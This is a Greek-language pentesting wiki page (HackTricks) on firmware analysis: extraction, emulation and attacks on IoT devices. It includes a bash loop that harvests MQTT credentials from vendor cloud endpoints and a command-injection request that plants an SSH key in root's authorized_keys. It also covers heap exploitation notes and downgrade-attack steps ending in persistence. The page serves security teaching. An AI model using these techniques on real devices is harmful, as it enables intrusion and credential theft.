# Ανάλυση Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Εισαγωγή**

### Σχετικοί πόροι


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Το Firmware είναι απαραίτητο software που επιτρέπει στις συσκευές να λειτουργούν σωστά, διαχειριζόμενο και διευκολύνοντας την επικοινωνία μεταξύ των hardware components και του software με το οποίο αλληλεπιδρούν οι χρήστες. Αποθηκεύεται σε μόνιμη μνήμη, διασφαλίζοντας ότι η συσκευή μπορεί να έχει πρόσβαση σε ζωτικές οδηγίες από τη στιγμή που ενεργοποιείται, οδηγώντας στην εκκίνηση του λειτουργικού συστήματος. Η εξέταση και η πιθανή τροποποίηση του Firmware είναι ένα κρίσιμο βήμα για τον εντοπισμό security vulnerabilities.<sup>[[2]](#references)[[3]](#references)</sup>

## **Συλλογή πληροφοριών**

Η **συλλογή πληροφοριών** είναι ένα κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Αυτή η διαδικασία περιλαμβάνει τη συλλογή δεδομένων σχετικά με:

- Την αρχιτεκτονική του CPU και το λειτουργικό σύστημα που εκτελεί
- Λεπτομέρειες του Bootloader
- Τη διάταξη του hardware και τα datasheets
- Μετρήσεις του codebase και τις τοποθεσίες του source code
- Εξωτερικές βιβλιοθήκες και τύπους αδειών
- Ιστορικό updates και regulatory certifications
- Αρχιτεκτονικά διαγράμματα και διαγράμματα ροής
- Security assessments και εντοπισμένα vulnerabilities

Για αυτόν τον σκοπό, τα εργαλεία **open-source intelligence (OSINT)** είναι ανεκτίμητα, όπως και η ανάλυση οποιωνδήποτε διαθέσιμων open-source software components μέσω manual και automated review processes. Εργαλεία όπως το [Coverity Scan](https://scan.coverity.com) και το [Semmle’s LGTM](https://lgtm.com/#explore) προσφέρουν δωρεάν static analysis που μπορεί να αξιοποιηθεί για τον εντοπισμό πιθανών προβλημάτων.

## **Απόκτηση του Firmware**

Η απόκτηση Firmware μπορεί να γίνει με διάφορους τρόπους, καθένας από τους οποίους έχει το δικό του επίπεδο πολυπλοκότητας:

- **Απευθείας** από την πηγή (developers, manufacturers)
- **Με δημιουργία** από τις παρεχόμενες οδηγίες
- **Με downloading** από επίσημα support sites
- Με χρήση ερωτημάτων **Google dork** για την εύρεση hosted firmware files
- Με απευθείας πρόσβαση σε **cloud storage**, με εργαλεία όπως το [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Με interception των **updates** μέσω man-in-the-middle techniques
- Με **extraction** από τη συσκευή μέσω συνδέσεων όπως **UART**, **JTAG** ή **PICit**
- Με **sniffing** των update requests μέσα στην επικοινωνία της συσκευής
- Με εντοπισμό και χρήση **hardcoded update endpoints**
- Με **dumping** από τον Bootloader ή το network
- Με **αφαίρεση και ανάγνωση** του storage chip, όταν όλα τα άλλα αποτυγχάνουν, χρησιμοποιώντας τα κατάλληλα hardware tools

### Logs μόνο μέσω UART: εξαναγκασμός root shell μέσω του U-Boot env στο flash

Αν το UART RX αγνοείται (μόνο logs), μπορείτε και πάλι να εξαναγκάσετε ένα init shell **επεξεργαζόμενοι το U-Boot environment blob** offline:<sup>[[6]](#references)</sup>

1. Κάντε dump του SPI flash με SOIC-8 clip και programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Εντοπίστε το U-Boot env partition, επεξεργαστείτε το `bootargs` ώστε να περιλαμβάνει `init=/bin/sh` και **υπολογίστε ξανά το U-Boot env CRC32** για το blob.
3. Κάντε reflash μόνο του env partition και κάντε reboot. Ένα shell θα πρέπει να εμφανιστεί στο UART.

Αυτό είναι χρήσιμο σε embedded devices όπου το shell του Bootloader είναι απενεργοποιημένο, αλλά το env partition είναι εγγράψιμο μέσω εξωτερικής πρόσβασης στο flash.

## Ανάλυση του Firmware

Τώρα που **έχετε το Firmware**, πρέπει να εξαγάγετε πληροφορίες σχετικά με αυτό, ώστε να γνωρίζετε πώς να το χειριστείτε. Υπάρχουν διάφορα εργαλεία που μπορείτε να χρησιμοποιήσετε για αυτό:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Αν δεν βρείτε πολλά με αυτά τα εργαλεία, ελέγξτε την **entropy** της εικόνας με `binwalk -E <bin>`. Αν η entropy είναι χαμηλή, τότε πιθανότατα δεν είναι κρυπτογραφημένη. Αν η entropy είναι υψηλή, πιθανότατα είναι κρυπτογραφημένη (ή συμπιεσμένη με κάποιον τρόπο).

Επιπλέον, μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να εξαγάγετε **αρχεία ενσωματωμένα μέσα στο firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ή το [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) για να επιθεωρήσετε το αρχείο.

### Λήψη του Filesystem

Με τα προηγούμενα εργαλεία που αναφέρθηκαν, όπως το `binwalk -ev <bin>`, θα πρέπει να έχετε καταφέρει να **εξαγάγετε το filesystem**.\
Το Binwalk συνήθως το εξάγει μέσα σε έναν **φάκελο με όνομα ίδιο με τον τύπο του filesystem**, ο οποίος συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Χειροκίνητη Εξαγωγή Filesystem

Μερικές φορές, το binwalk **δεν θα έχει το magic byte του filesystem στις υπογραφές του**. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε το binwalk για να **βρείτε το offset του filesystem και να αποκόψετε το συμπιεσμένο filesystem** από το binary και, στη συνέχεια, **εξαγάγετε χειροκίνητα** το filesystem σύμφωνα με τον τύπο του, χρησιμοποιώντας τα παρακάτω βήματα.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Εκτελέστε την ακόλουθη **dd command** για να κάνετε carving του Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Εναλλακτικά, μπορεί να εκτελεστεί και η ακόλουθη εντολή.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (που χρησιμοποιείται στο παραπάνω παράδειγμα)

`$ unsquashfs dir.squashfs`

Τα αρχεία θα βρίσκονται στη συνέχεια στον κατάλογο "`squashfs-root`".

- Αρχεία archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για filesystems jffs2

`$ jefferson rootfsfile.jffs2`

- Για filesystems ubifs με NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Ανάλυση Firmware

Μόλις αποκτηθεί το firmware, είναι απαραίτητο να αναλυθεί διεξοδικά, ώστε να γίνει κατανοητή η δομή του και οι πιθανές ευπάθειές του. Αυτή η διαδικασία περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και την εξαγωγή χρήσιμων δεδομένων από το firmware image.

### Εργαλεία αρχικής ανάλυσης

Παρέχεται ένα σύνολο εντολών για την αρχική επιθεώρηση του binary file (το οποίο αναφέρεται ως `<bin>`). Αυτές οι εντολές βοηθούν στον εντοπισμό τύπων αρχείων, στην εξαγωγή strings, στην ανάλυση binary data και στην κατανόηση των λεπτομερειών των partitions και των filesystems:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Για την αξιολόγηση της κατάστασης κρυπτογράφησης της εικόνας, ελέγχεται η **entropy** με `binwalk -E <bin>`. Χαμηλή entropy υποδηλώνει απουσία κρυπτογράφησης, ενώ υψηλή entropy υποδεικνύει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή **embedded files**, συνιστώνται εργαλεία και resources όπως το documentation **file-data-carving-recovery-tools** και το **binvis.io** για την επιθεώρηση αρχείων.

### Εξαγωγή του Filesystem

Με τη χρήση του `binwalk -ev <bin>`, είναι συνήθως δυνατή η εξαγωγή του filesystem, συχνά σε έναν κατάλογο με όνομα που αντιστοιχεί στον τύπο του filesystem (π.χ. squashfs, ubifs). Ωστόσο, όταν το **binwalk** δεν αναγνωρίζει τον τύπο του filesystem λόγω απουσίας magic bytes, απαιτείται χειροκίνητη εξαγωγή. Αυτό περιλαμβάνει τη χρήση του `binwalk` για τον εντοπισμό του offset του filesystem και, στη συνέχεια, την εντολή `dd` για την εξαγωγή του filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Στη συνέχεια, ανάλογα με τον τύπο του filesystem (π.χ. squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για τη χειροκίνητη εξαγωγή των περιεχομένων.

### Ανάλυση Filesystem

Με το filesystem εξαγμένο, ξεκινά η αναζήτηση security flaws. Η προσοχή επικεντρώνεται σε μη ασφαλή network daemons, hardcoded credentials, API endpoints, λειτουργίες update server, uncompiled code, startup scripts και compiled binaries για offline analysis.

**Βασικές τοποθεσίες** και **στοιχεία** προς επιθεώρηση περιλαμβάνουν:

- Τα **etc/shadow** και **etc/passwd** για credentials χρηστών
- SSL certificates και keys στο **etc/ssl**
- Αρχεία configuration και scripts για πιθανές vulnerabilities
- Embedded binaries για περαιτέρω analysis
- Συνηθισμένα web servers και binaries συσκευών IoT

Αρκετά εργαλεία βοηθούν στην αποκάλυψη sensitive information και vulnerabilities μέσα στο filesystem:

- Τα [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για αναζήτηση sensitive information
- Το [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για comprehensive firmware analysis
- Τα [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) και [**EMBA**](https://github.com/e-m-b-a/emba) για static και dynamic analysis

### Security Checks σε Compiled Binaries

Τόσο ο source code όσο και τα compiled binaries που εντοπίζονται στο filesystem πρέπει να εξετάζονται σχολαστικά για vulnerabilities. Εργαλεία όπως το **checksec.sh** για Unix binaries και το **PESecurity** για Windows binaries βοηθούν στον εντοπισμό μη προστατευμένων binaries που θα μπορούσαν να γίνουν αντικείμενο εκμετάλλευσης.

## Συλλογή cloud config και MQTT credentials μέσω derived URL tokens

Πολλά IoT hubs λαμβάνουν το configuration τους ανά συσκευή από ένα cloud endpoint που έχει τη μορφή:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Κατά τη διάρκεια του firmware analysis μπορεί να διαπιστώσετε ότι το `<token>` προκύπτει τοπικά από το device ID, χρησιμοποιώντας ένα hardcoded secret, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) και αναπαρίσταται ως uppercase hex

Αυτός ο σχεδιασμός επιτρέπει σε οποιονδήποτε γνωρίζει ένα deviceId και το STATIC_KEY να ανακατασκευάσει το URL και να ανακτήσει το cloud config, αποκαλύπτοντας συχνά plaintext MQTT credentials και topic prefixes.

Πρακτική διαδικασία:

1) Εξαγωγή του deviceId από τα UART boot logs

- Συνδέστε έναν 3.3V UART adapter (TX/RX/GND) και καταγράψτε τα logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Αναζητήστε γραμμές που εκτυπώνουν το μοτίβο URL του cloud config και τη διεύθυνση του broker, για παράδειγμα:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Ανάκτηση του STATIC_KEY και του αλγορίθμου token από το firmware

- Φορτώστε τα binaries στο Ghidra/radare2 και αναζητήστε το config path ("/pf/") ή τη χρήση του MD5.
- Επιβεβαιώστε τον αλγόριθμο (π.χ., MD5(deviceId||STATIC_KEY)).
- Παράγετε το token σε Bash και μετατρέψτε το digest σε κεφαλαία:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Συλλογή cloud config και MQTT credentials

- Συνθέστε το URL και ανακτήστε JSON με curl· αναλύστε το με jq για να εξαγάγετε secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Εκμετάλλευση plaintext MQTT και αδύναμων topic ACLs (εάν υπάρχουν)

- Χρησιμοποιήστε τα credentials που ανακτήθηκαν για να κάνετε subscribe σε maintenance topics και αναζητήστε ευαίσθητα συμβάντα:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerate προβλέψιμα device IDs (σε κλίμακα, με authorization)

- Πολλά ecosystems ενσωματώνουν bytes vendor OUI/product/type ακολουθούμενα από ένα sequential suffix.
- Μπορείτε να κάνετε iterate σε candidate IDs, να derive tokens και να κάνετε fetch configs programmatically:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Σημειώσεις
- Να λαμβάνετε πάντα explicit authorization πριν επιχειρήσετε mass enumeration.
- Να προτιμάτε emulation ή static analysis για την ανάκτηση secrets χωρίς τροποποίηση του target hardware, όταν είναι εφικτό.


Η διαδικασία emulating firmware επιτρέπει **dynamic analysis** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να αντιμετωπίσει προκλήσεις που σχετίζονται με dependencies του hardware ή της αρχιτεκτονικής, όμως η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με συμβατή αρχιτεκτονική και endianness, όπως ένα Raspberry Pi, ή σε μια pre-built virtual machine, μπορεί να διευκολύνει περαιτέρω testing.

### Emulating Individual Binaries

Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να προσδιοριστούν το endianness και η CPU architecture του προγράμματος.

#### Παράδειγμα με MIPS Architecture

Για την emulation ενός binary αρχιτεκτονικής MIPS, μπορεί να χρησιμοποιηθεί η εντολή:
```bash
file ./squashfs-root/bin/busybox
```
Και για την εγκατάσταση των απαραίτητων εργαλείων emulation:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Για MIPS (big-endian), χρησιμοποιείται το `qemu-mips`, ενώ για binaries little-endian, η επιλογή θα ήταν το `qemu-mipsel`.

#### Εξομοίωση ARM Architecture

Για ARM binaries, η διαδικασία είναι παρόμοια, με τη χρήση του emulator `qemu-arm` για την εξομοίωση.

### Πλήρης εξομοίωση συστήματος

Εργαλεία όπως τα [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) και άλλα διευκολύνουν την πλήρη εξομοίωση firmware, αυτοματοποιώντας τη διαδικασία και υποστηρίζοντας το dynamic analysis.

## Dynamic Analysis στην πράξη

Σε αυτό το στάδιο, χρησιμοποιείται για analysis είτε ένα πραγματικό είτε ένα emulated device environment. Είναι απαραίτητο να διατηρείται πρόσβαση shell στο OS και στο filesystem. Η εξομοίωση μπορεί να μην αναπαριστά τέλεια τις αλληλεπιδράσεις με το hardware, γεγονός που ενδέχεται να απαιτεί περιστασιακά restart της εξομοίωσης. Το analysis θα πρέπει να επανεξετάζει το filesystem, να εκμεταλλεύεται exposed webpages και network services και να διερευνά vulnerabilities του bootloader. Τα firmware integrity tests είναι κρίσιμα για τον εντοπισμό πιθανών backdoor vulnerabilities.

## Τεχνικές Runtime Analysis

Το runtime analysis περιλαμβάνει την αλληλεπίδραση με μια process ή ένα binary στο operating environment του, με τη χρήση εργαλείων όπως τα gdb-multiarch, Frida και Ghidra για τον ορισμό breakpoints και τον εντοπισμό vulnerabilities μέσω fuzzing και άλλων τεχνικών.

Για embedded targets χωρίς πλήρη debugger, **αντιγράψτε ένα statically-linked `gdbserver`** στη συσκευή και πραγματοποιήστε remote attach:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Αντιστοίχιση μηνυμάτων Zigbee / radio co-processor

Σε IoT hubs, το RF stack συχνά διαχωρίζεται μεταξύ ενός **radio MCU** και μιας διεργασίας Linux userland. Μια χρήσιμη ροή εργασίας είναι η χαρτογράφηση της διαδρομής:<sup>[[8]](#references)</sup>

1. **RF frame** στον αέρα
2. **controller-side parser** στο radio MCU
3. **serial/UART text ή TLV protocol** που προωθείται στο Linux (για παράδειγμα `/dev/tty*`)
4. **application dispatcher** στο κύριο daemon
5. **protocol-specific handler / state machine**

Αυτή η αρχιτεκτονική δημιουργεί δύο reversing targets αντί για ένα. Αν ο controller μετατρέπει τα binary radio frames σε ένα textual protocol όπως `Group,Command,arg1,arg2,...`, εντόπισε:

- Τα **message groups** και τους dispatch tables
- Ποια μηνύματα μπορούν να προέρχονται από το **network** και ποια από τον ίδιο τον controller
- Τα ακριβή **manufacturer-specific discriminator fields** (για παράδειγμα Zigbee `manufacturer_code` και custom `cluster_command`)
- Ποιοι handlers είναι προσβάσιμοι μόνο κατά τις φάσεις **commissioning**, discovery ή firmware/model download

Ειδικά για το Zigbee, κατέγραψε την κίνηση pairing και έλεγξε αν ο στόχος εξακολουθεί να βασίζεται στο προεπιλεγμένο **Link Key** `ZigBeeAlliance09`. Αν ισχύει αυτό, το sniffing της κίνησης commissioning μπορεί να αποκαλύψει το **Network Key**. Τα Zigbee 3.0 install codes μειώνουν αυτή την έκθεση, επομένως σημείωσε αν η συσκευή που δοκιμάστηκε τα επιβάλλει πραγματικά.

### Manufacturer-specific protocol handlers και FSM-gated reachability

Οι vendor-specific εντολές Zigbee/ZCL αποτελούν συχνά καλύτερο στόχο από τα standardized clusters, επειδή τροφοδοτούν **custom parsing code** και εσωτερικά **FSMs** με λιγότερο δοκιμασμένη validation.<sup>[[8]](#references)</sup>

Πρακτική ροή εργασίας:

- Κάνε reverse τον command dispatcher μέχρι να βρεις τον **vendor-only handler**.
- Ανάκτησε τους πίνακες **FSM state**, **event**, **check**, **action** και **next-state**.
- Εντόπισε τα **transitional states** που προχωρούν αυτόματα, καθώς και τα retry/error branches που τελικά κάνουν reset ή free σε state που ελέγχεται από τον attacker.
- Επιβεβαίωσε ποιες νόμιμες protocol exchanges απαιτούνται για να τοποθετηθεί το daemon στην ευάλωτη κατάσταση, αντί να θεωρείς ότι ο buggy handler είναι πάντα προσβάσιμος.

Για timing-sensitive protocols, το packet replay από ένα Python framework μπορεί να είναι υπερβολικά αργό. Μια πιο αξιόπιστη προσέγγιση είναι η emulation μιας νόμιμης συσκευής σε πραγματικό hardware (για παράδειγμα ένα **nRF52840**) με vendor-grade stack, ώστε να μπορείς να εκθέσεις τα σωστά **endpoints**, **attributes** και τον σωστό χρονισμό του commissioning.

### Κατηγορία fragmented-download bugs σε embedded daemons

Μια επαναλαμβανόμενη κατηγορία firmware bugs εμφανίζεται σε **fragmented blob/model/configuration downloads**:<sup>[[8]](#references)</sup>

1. Το **first fragment** (`offset == 0`) αποθηκεύει το `ctx->total_size` και κάνει allocate `malloc(total_size)`.
2. Τα επόμενα fragments κάνουν validation μόνο σε attacker-controlled **packet-local** fields, όπως `packet_total_size >= offset + chunk_len`.
3. Το copy χρησιμοποιεί `memcpy(&ctx->buffer[offset], chunk, chunk_len)` χωρίς έλεγχο ως προς το **original allocated size**.

Αυτό επιτρέπει σε έναν attacker να στείλει:

- Ένα πρώτο έγκυρο fragment με **small** δηλωμένο total size, ώστε να επιβάλει μικρό heap allocation.
- Ένα μεταγενέστερο fragment με το **expected offset**, αλλά μεγαλύτερο `chunk_len`.
- Ένα forged packet-local size που ικανοποιεί τους νέους ελέγχους, ενώ εξακολουθεί να κάνει overflow στο buffer που είχε αρχικά allocated.

Όταν η ευάλωτη διαδρομή βρίσκεται πίσω από commissioning logic, η exploitation πρέπει να περιλαμβάνει αρκετό **device emulation**, ώστε να οδηγήσει τον στόχο στην αναμενόμενη κατάσταση model-download ή blob-download πριν σταλούν τα malformed fragments.

### Protocol-driven `free()` triggers

Σε embedded daemons, ο ευκολότερος τρόπος για να ενεργοποιηθεί heap metadata exploitation συχνά δεν είναι το «wait for cleanup», αλλά η **επιβολή του error handling του ίδιου του protocol**:<sup>[[8]](#references)</sup>

- Στείλε malformed follow-up fragments, ώστε να οδηγήσεις το FSM σε **retry** ή **error** states.
- Ξεπέρασε το retry threshold, ώστε το daemon να κάνει **reset context** και να κάνει free το corrupted buffer.
- Χρησιμοποίησε αυτό το προβλέψιμο `free()` για να ενεργοποιήσεις allocator-side primitives πριν η διεργασία καταρρεύσει για άσχετους λόγους.

Αυτό είναι ιδιαίτερα χρήσιμο εναντίον **musl/uClibc/dlmalloc-like** allocators σε embedded Linux, όπου η αλλοίωση chunk metadata μπορεί να μετατρέψει τη λογική unlink/unbin σε write primitive. Ένα σταθερό pattern είναι η αλλοίωση ενός **size field**, ώστε να ανακατευθυνθεί το allocator traversal σε **fake chunks** που έχουν τοποθετηθεί μέσα στο overflowed buffer, αντί να γίνει άμεση αλλοίωση πραγματικών bin pointers και να προκληθεί crash της διεργασίας.

## Binary Exploitation και Proof-of-Concept

Η ανάπτυξη ενός PoC για εντοπισμένα vulnerabilities απαιτεί βαθιά κατανόηση της αρχιτεκτονικής του στόχου και προγραμματισμό σε lower-level languages. Τα binary runtime protections σε embedded systems είναι σπάνια, αλλά όταν υπάρχουν, μπορεί να χρειάζονται τεχνικές όπως το Return Oriented Programming (ROP).

### Σημειώσεις uClibc fastbin exploitation (embedded Linux)

- **Fastbins + consolidation:** Το uClibc χρησιμοποιεί fastbins παρόμοια με το glibc. Ένα μεταγενέστερο large allocation μπορεί να ενεργοποιήσει το `__malloc_consolidate()`, επομένως κάθε fake chunk πρέπει να περνά τους ελέγχους (sane size, `fd = 0` και surrounding chunks που θεωρούνται "in use").<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** Αν το ASLR είναι ενεργοποιημένο αλλά το κύριο binary είναι **non-PIE**, οι διευθύνσεις του in-binary `.data/.bss` είναι σταθερές. Μπορείς να στοχεύσεις μια περιοχή που ήδη μοιάζει με έγκυρο heap chunk header, ώστε να τοποθετήσεις ένα fastbin allocation σε έναν **function pointer table**.
- **Parser-stopping NUL:** Όταν γίνεται parsing JSON, ένα `\x00` στο payload μπορεί να σταματήσει το parsing, διατηρώντας παράλληλα τα trailing attacker-controlled bytes για stack pivot/ROP chain.
- **Shellcode μέσω `/proc/self/mem`:** Ένα ROP chain που καλεί `open("/proc/self/mem")`, `lseek()` και `write()` μπορεί να τοποθετήσει executable shellcode σε ένα γνωστό mapping και να κάνει jump σε αυτό.

## Προετοιμασμένα Operating Systems για Firmware Analysis

Operating systems όπως τα [AttifyOS](https://github.com/adi0x90/attifyos) και [EmbedOS](https://github.com/scriptingxss/EmbedOS) παρέχουν pre-configured environments για firmware security testing, εξοπλισμένα με τα απαραίτητα tools.

## Προετοιμασμένα OSs για Firmware Analysis

- [**AttifyOS**](https://github.com/adi0x90/attifyos): Το AttifyOS είναι ένα distro που προορίζεται να σε βοηθήσει να πραγματοποιήσεις security assessment και penetration testing σε Internet of Things (IoT) devices. Εξοικονομεί αρκετό χρόνο, παρέχοντας ένα pre-configured environment με όλα τα απαραίτητα tools φορτωμένα.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system βασισμένο στο Ubuntu 18.04, με προεγκατεστημένα firmware security testing tools.

## Firmware Downgrade Attacks και Insecure Update Mechanisms

Ακόμη και όταν ένας vendor υλοποιεί cryptographic signature checks για firmware images, η **version rollback (downgrade) protection συχνά παραλείπεται**. Όταν ο boot- ή recovery-loader επαληθεύει μόνο την υπογραφή με embedded public key, αλλά δεν συγκρίνει την *version* (ή έναν monotonic counter) του image που γίνεται flash, ένας attacker μπορεί νόμιμα να εγκαταστήσει ένα **παλαιότερο, ευάλωτο firmware που εξακολουθεί να φέρει έγκυρη υπογραφή** και έτσι να επαναφέρει patched vulnerabilities.<sup>[[4]](#references)</sup>

Τυπική ροή επίθεσης:

1. **Απόκτησε ένα παλαιότερο signed image**
* Πάρε το από το public download portal, το CDN ή το support site του vendor.
* Κάνε extract από companion mobile/desktop applications (π.χ. μέσα σε ένα Android APK, κάτω από `assets/firmware/`).
* Ανάκτησέ το από third-party repositories όπως VirusTotal, Internet archives, forums κ.λπ.
2. **Κάνε upload ή serve το image στη συσκευή** μέσω οποιουδήποτε exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT κ.λπ.
* Πολλές consumer IoT devices εκθέτουν *unauthenticated* HTTP(S) endpoints που δέχονται Base64-encoded firmware blobs, τα κάνουν decode server-side και ενεργοποιούν recovery/upgrade.
3. Μετά το downgrade, κάνε exploit ένα vulnerability που είχε patched στη νεότερη έκδοση (για παράδειγμα ένα command-injection filter που προστέθηκε αργότερα).
4. Προαιρετικά, κάνε ξανά flash το latest image ή απενεργοποίησε τα updates για να αποφύγεις τον εντοπισμό, αφού αποκτήσεις persistence.

### Παράδειγμα: Command Injection μετά από Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Στο ευάλωτο (υποβαθμισμένο) firmware, η παράμετρος `md5` συνενώνεται απευθείας σε μια εντολή shell χωρίς sanitisation, επιτρέποντας την εισαγωγή αυθαίρετων εντολών (εδώ – την ενεργοποίηση πρόσβασης root μέσω SSH key). Οι νεότερες εκδόσεις του firmware εισήγαγαν ένα βασικό φίλτρο χαρακτήρων, όμως η απουσία προστασίας από downgrade καθιστά τη διόρθωση ανώφελη.<sup>[[4]](#references)</sup>

### Εξαγωγή Firmware Από Mobile Apps

Πολλοί vendors περιλαμβάνουν πλήρεις εικόνες firmware μέσα στις συνοδευτικές mobile applications, ώστε η εφαρμογή να μπορεί να ενημερώνει τη συσκευή μέσω Bluetooth/Wi-Fi. Αυτά τα πακέτα αποθηκεύονται συνήθως χωρίς κρυπτογράφηση στο APK/APEX, σε διαδρομές όπως `assets/fw/` ή `res/raw/`. Εργαλεία όπως τα `apktool`, `ghidra` ή ακόμη και το απλό `unzip` επιτρέπουν την εξαγωγή υπογεγραμμένων images χωρίς αλληλεπίδραση με το φυσικό hardware.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Παράκαμψη anti-rollback μόνο μέσω updater σε σχεδιάσεις A/B slot

Ορισμένοι vendors υλοποιούν πράγματι ένα anti-downgrade **ratchet**, αλλά μόνο μέσα στη λογική του *updater* (για παράδειγμα, μια UDS routine μέσω CAN, μια recovery command ή ένας userspace OTA agent). Αν ο **bootloader** ελέγχει αργότερα μόνο το image signature/CRC και εμπιστεύεται τον partition table ή τα slot metadata, η προστασία από rollback μπορεί και πάλι να παρακαμφθεί.<sup>[[7]](#references)</sup>

Τυπική αδύναμη σχεδίαση:

- Τα firmware metadata περιέχουν τόσο έναν version descriptor όσο και έναν **security ratchet** / monotonic counter.
- Ο updater συγκρίνει το image ratchet με μια τιμή αποθηκευμένη σε persistent storage και απορρίπτει παλαιότερα signed images.
- Ο bootloader **δεν** κάνει parse το ratchet και επαληθεύει μόνο το header, το CRC και το signature πριν εκκινήσει το επιλεγμένο slot.
- Η ενεργοποίηση του slot αποθηκεύεται ξεχωριστά σε partition table ή σε per-slot generation counter και **δεν συνδέεται κρυπτογραφικά** με το ακριβές firmware digest που επικυρώθηκε.

